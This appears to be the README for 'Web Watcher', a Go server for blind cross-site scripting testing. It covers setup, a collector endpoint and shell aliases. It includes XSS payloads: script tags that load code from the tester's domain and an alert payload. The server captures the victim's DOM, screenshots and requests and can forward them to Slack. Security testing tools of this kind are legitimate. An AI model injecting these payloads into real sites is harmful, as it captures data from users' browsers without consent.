# Web Watcher  
Golang server for testing blind XSS.   
Special endpoint for testing requests and file extensions.  

## Setup  
1. Install  
```
git clone https://github.com/pichik/pfolio
```
2. Build application
```
sudo go build -o /usr/local/bin/pfolio pfolio/main.go
```
3. Set permissions for ports 
```
sudo setcap CAP_NET_BIND_SERVICE+ep ~/go/bin/pfolio
``` 
3. Fill `.wwconfig` and add it to your home directory.  
4. Move web directory to a place specified in config.  
5. Remove the rest.

All files in `assets/` are publicly accessible.  
If you are running https, directory with certificates should be generated.  

**!! Change domain in bait.js to your domain name !!**  

## Usage
Login to your website with /login?token=[token]  

After authentication, you can find all requests in `/results/all`.  
Left side is from  XSS requests.  
Right side is from custom path requests.  
![results](screenshots/results.png)  


### Collecting simple data from Collector path
This endpoint will contain response specified in `assets/extensions.json` file  
```
  "js": {
    "Extension": [".js", ".mjs"],
    "Content-Type": "application/javascript",
    "Payload": "alert(document.domain)"
  }
```   
Insert this payload to the website, alert will popup.  
`<script src=https://domain.com/pichik.js></script>`  
This endpoint use regex `pichik.*` so you can use `pichik-anything/after/counts.html`  

### Collecting data from blind XSS  
You can use any endpoint for testing blind XSS, but dont use your collector path for this, as it have priority, so no blind XSS payload will be send.  
Detailed report will be created, with DOM and Screenshot.  
These request will be sent to slack, if specified in config.  
`<script src=https://domain.com></script>`  
![blind xss](screenshots/blindxss.png)  


## Aliases
Useful linux aliases  
```
alias webstep='sudo mv ~/main /usr/local/bin/ww'
alias webstep2='sudo setcap CAP_NET_BIND_SERVICE+ep /usr/local/bin/ww'
alias wwinstal='webstep && webstep2; echo "Web watcher installed"'

alias wwstart='nohup ww >/dev/null 2>&1 & echo "Web watcher started"'
alias wwstop='pkill ww; echo "Web watcher stopped"'
alias wwrestart='wwstop;wwstart; echo "Web watcher restarted"'
alias wwdebug='tail -f ~/web/logs/debug.txt'
alias wwlog='tail -f ~/web/logs/requests.txt'
```
